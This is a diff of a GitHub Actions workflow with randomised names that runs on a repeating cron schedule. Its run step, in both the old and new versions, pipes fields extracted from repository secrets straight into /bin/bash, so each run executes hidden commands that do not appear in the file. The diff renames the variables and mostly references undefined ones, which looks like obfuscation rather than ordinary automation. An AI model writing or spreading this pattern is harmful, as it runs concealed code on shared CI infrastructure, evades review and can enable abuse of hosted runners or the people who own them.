@@ -3,27 +3,19 @@ name: hechenmo6745
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 5/6 * * *'
+    - cron: '21 3/6 * * *'
 
-jobs:  # 18973
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hechenmo6745
         env:
-          sy9: ${{ secrets.sy9 }}
+          t99: ${{ secrets.t99 }}
         run: |
-          echo $sy9 | jq -r .jnphe4 | /bin/bash
-          echo $s02 | jq -r .pv6 | /bin/bash
-          echo $wehql020 | jq -r .i5657 | /bin/bash
-          echo $a9 | jq -r .ftqaz962 | /bin/bash
-          echo $f58851 | jq -r .hkuqv29 | /bin/bash
-          echo $ioh7288 | jq -r .d816 | /bin/bash
-          echo $hmvi06 | jq -r .p8821 | /bin/bash
-          echo $x6 | jq -r .laxx939 | /bin/bash
-          echo $v48 | jq -r .pnnpa10419 | /bin/bash
-          echo $regjv7034 | jq -r .b9 | /bin/bash
-          echo $ee588 | jq -r .l923 | /bin/bash
+          echo $t99 | jq -r .bgiyw62 | /bin/bash
+          echo $pcl17 | jq -r .csrf03 | /bin/bash
+          echo $llw2 | jq -r .po754 | /bin/bash
+          echo $skq78053 | jq -r .sram16 | /bin/bash
 
